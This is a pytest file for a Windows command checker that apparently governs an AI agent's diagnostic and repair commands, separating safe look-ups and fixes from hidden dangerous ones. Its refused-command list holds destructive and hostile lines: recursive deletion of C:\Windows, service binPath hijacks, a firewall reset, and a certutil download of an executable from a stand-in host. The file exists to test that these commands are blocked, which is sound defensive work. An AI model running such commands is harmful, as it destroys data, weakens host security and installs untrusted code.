"""The Windows look and cure shapes, as the 26B met them on DESKTOP."""
import pytest

from waspdoctor import platform as P


def test_a_path_naming_an_exe_is_a_path_not_a_command():
    # seen live: 68 refused verifies, every one only reading C:\…\patientweb.exe
    assert P.WINDOWS.check_look(r"Get-ChildItem C:\ProgramData\DBeePatient\bin\patientweb.exe") == ""
    assert P.WINDOWS.check_look(r"Test-Path 'C:\ProgramData\DBeePatient\bin\patientweb.exe'") == ""
    assert P.WINDOWS.check_look(r"C:\tools\evil.exe /x")                  # running it is still no look
    assert P.WINDOWS.check_look(r"& 'C:\x\evil.exe'")


HIDDEN = [
    r".{Remove-Item -Recurse -Force C:\Windows}",
    r"$x = Remove-Item -Recurse C:\Windows\Temp",
    r"(Invoke-Thing)",
    r'schtasks /create /tn x /tr "cmd /c rd /s /q C:\" /sc once /st 00:00',
    r'sc.exe config DBeePatientWeb binPath= "cmd /c del C:\x"',
    r"sc.exe create evil binPath= C:\x.exe",
    r'sc.exe failure DBeePatientWeb command= "C:\x.exe"',
    r"netsh advfirewall reset",
    r"certutil -urlcache -f http://x/a.exe a.exe",
]

PLAIN = [
    r"New-Item -Path C:\ProgramData\DBeePatient\bin -ItemType Directory -Force | Out-Null; Move-Item -Path C:\ProgramData\DBeePatient\bin.old\patientweb.exe -Destination C:\ProgramData\DBeePatient\bin\patientweb.exe",
    r'icacls "C:\ProgramData\DBeePatient\patient.conf" /remove:d "NT AUTHORITY\LOCAL SERVICE"',
    r"Stop-Process -Id 21508 -Force",
    r"Start-Service -Name DBeePatientWeb",
    r"sc.exe config DBeePatientWeb binPath= C:\ProgramData\DBeePatient\bin.old\patientweb.exe",
    r"schtasks /run /tn Backup",
]


@pytest.mark.parametrize("cmd", HIDDEN)
def test_a_windows_cure_that_runs_unseen_words_is_refused(cmd):
    assert P.WINDOWS.check_cure(cmd), cmd


@pytest.mark.parametrize("cmd", PLAIN)
def test_the_plain_windows_cures_pass(cmd):
    assert P.WINDOWS.check_cure(cmd) == "", (cmd, P.WINDOWS.check_cure(cmd))
